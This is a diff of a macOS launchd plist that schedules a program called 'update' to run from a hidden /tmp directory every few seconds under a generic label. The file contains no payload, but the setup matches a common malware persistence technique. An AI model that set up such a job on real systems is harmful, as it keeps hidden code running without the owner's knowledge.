@@ -1,22 +1,25 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-  <dict>
+<dict>
     <key>Label</key>
-    <string>com.example.myapp</string>
+    <string>com.test</string>
     <key>ProgramArguments</key>
     <array>
-      <string>/tmp/.tHhCc/update</string>
+        <string>/tmp/.tHcCc/update</string>
     </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/tmp/logfileout.log</string>
-    <key>StandardErrorPath</key>
-    <string>/tmp/logfilein.log</string>
+    <key>StartCalendarInterval</key>
+    <dict>
+        <key>Minute</key>
+        <integer>1</integer>
+        <key>Hour</key>
+        <integer>0</integer>
+    </dict>
     <key>StartInterval</key>
-    <integer>10</integer>
-  </dict>
+    <integer>3</integer>
+    <key>StandardOutPath</key>
+    <string>/tmp/stdout</string>
+    <key>StandardErrorPath</key>
+    <string>/tmp/error.txt</string>
+</dict>
 </plist>
